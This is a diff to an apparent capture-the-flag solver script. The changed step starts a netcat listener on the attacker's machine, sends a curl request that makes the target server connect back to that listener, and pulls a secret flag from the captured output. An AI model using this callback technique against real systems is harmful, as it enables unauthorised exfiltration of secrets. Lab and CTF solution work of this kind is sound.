@@ -20,7 +20,7 @@ echo "2 - RETRIEVING SECRET KEY"
 rm /work/10-nc-log.txt 2> /dev/null
 sudo mate-terminal -- bash -c "nc -lvnp 8087 | tee /work/10-nc-log.txt; exec bash"  &
 sleep 3
-curl -s -X GET "http://$target_ip:8087/download?server=$attack_ip:8087&id=75482342" 2> /dev/null &
+curl -s -X GET "http://$target_ip:8087/download?server=$attack_ip:8087&id=75482342" > /dev/null 2> /dev/null &
 sleep 1
 echo "--> Flag is : $(awk 'BEGIN { FS=":" } NR % 5 == 0 { print $2 }' /work/10-nc-log.txt)"
 
